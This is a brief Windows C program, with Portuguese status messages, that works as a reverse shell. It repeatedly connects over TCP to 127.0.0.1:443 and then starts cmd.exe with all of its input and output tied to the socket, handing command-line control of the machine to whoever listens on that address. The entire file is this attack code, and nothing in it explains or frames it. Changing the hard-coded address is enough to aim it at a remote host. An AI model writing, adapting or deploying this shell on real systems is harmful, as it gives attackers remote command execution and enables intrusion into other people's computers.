#include <stdio.h>
#include <stdlib.h>
#include <winsock.h>
#include <winsock2.h>
int main(){
WSADATA wsa;
struct sockaddr_in cliente;
struct sockaddr_in *ptr;
SOCKET s;
ptr=&cliente;
cliente.sin_addr.s_addr=inet_addr("127.0.0.1");
cliente.sin_family=AF_INET;
cliente.sin_port=htons(443);
if(WSAStartup(MAKEWORD(2,2),&wsa)!=0){
    printf("erro wsastartup \n");

}
s=WSASocket(AF_INET, SOCK_STREAM, IPPROTO_TCP, NULL, NULL, NULL);
while(2){
        Sleep(5000);
    if(connect(s,ptr,sizeof cliente)==0){
        printf(" conexao aceita \n");
        break;
    }
else{
    printf("tentando se conectar \n");
}
}
STARTUPINFO sti;
PROCESS_INFORMATION psi;
memset(&sti,0,sizeof(sti));
memset(&psi,0,sizeof(psi));
sti.cb=sizeof(STARTUPINFO);
sti.dwFlags=(STARTF_USESTDHANDLES | STARTF_USESHOWWINDOW);
sti.hStdError=(HANDLE)s;
sti.hStdInput=(HANDLE)s;
sti.hStdOutput=(HANDLE)s;
char process[]="cmd.exe";
CreateProcess(NULL, process, NULL, NULL, TRUE, 0, NULL,	NULL, &sti, &psi);
WaitForSingleObject(psi.hProcess, INFINITE);





return 0;}
